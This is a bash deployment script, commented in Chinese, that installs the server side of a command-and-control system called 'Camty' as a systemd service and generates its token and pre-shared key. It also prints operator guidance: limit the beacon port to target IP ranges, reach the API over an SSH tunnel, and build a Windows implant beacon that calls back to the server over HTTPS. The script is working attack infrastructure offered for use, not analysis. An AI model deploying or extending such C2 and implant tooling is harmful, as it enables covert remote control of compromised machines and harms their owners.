#!/usr/bin/env bash
# Camty C2 服务器端一键部署（Ubuntu 20.04+ / Debian 11+）
# 用法：把 warroom 仓库放 /opt/camty 后执行：
#   sudo bash c2/deploy/deploy.sh
set -euo pipefail

REPO=/opt/camty
ENV_DIR=/etc/camty
DATA_DIR=/var/lib/camty

[ -d "$REPO/c2/server" ] || { echo "请先把仓库放到 $REPO"; exit 1; }

# 1) 运行用户与目录
id camty >/dev/null 2>&1 || useradd --system --no-create-home --shell /usr/sbin/nologin camty
install -d -o camty -g camty -m 0750 "$DATA_DIR"
install -d -m 0700 "$ENV_DIR"

# 2) 凭据（已存在则跳过）
if [ ! -f "$ENV_DIR/c2.env" ]; then
  TOKEN=$(python3 -c "import secrets; print(secrets.token_hex(24))")
  PSK=$(python3 -c "import secrets; print(secrets.token_hex(32))")
  sed -e "s/替换为48位hex/$TOKEN/" -e "s/替换为64位hex/$PSK/" \
      "$REPO/c2/deploy/c2.env.example" > "$ENV_DIR/c2.env"
  chmod 0600 "$ENV_DIR/c2.env"
  echo "生成凭据：token/psk 已写入 $ENV_DIR/c2.env（植入体构建用其中的 psk）"
else
  echo "凭据已存在，跳过生成"
fi

# 3) systemd 服务
install -m 0644 "$REPO/c2/deploy/camty-c2.service" /etc/systemd/system/camty-c2.service
systemctl daemon-reload
systemctl enable --now camty-c2
sleep 1
systemctl --no-pager status camty-c2 | head -5

echo ""
echo "== 安全组/防火墙（务必收紧）=="
echo "  放行：beacon 端口（见 c2.env，默认 8443）——只放行目标出口 IP 段"
echo "  不放行：api 端口（仅本机，operator 走 SSH 隧道：ssh -L 8801:127.0.0.1:8801）"
echo "  华为云：控制台安全组入方向加规则；AWS：Security Group 编辑 Inbound"
echo ""
echo "== 植入体构建对照（本地 Windows 构建）=="
echo "  python c2/implant/build_beacon.py --psk <c2.env 里的 PSK> \\"
echo "      --host <域名或EIP> --port 443 --sleep 30 \\"
echo "      --scheme https --tls-verify 1 \\"
echo "      --path-beacon /api/v1/heartbeat --path-result /api/v1/report"
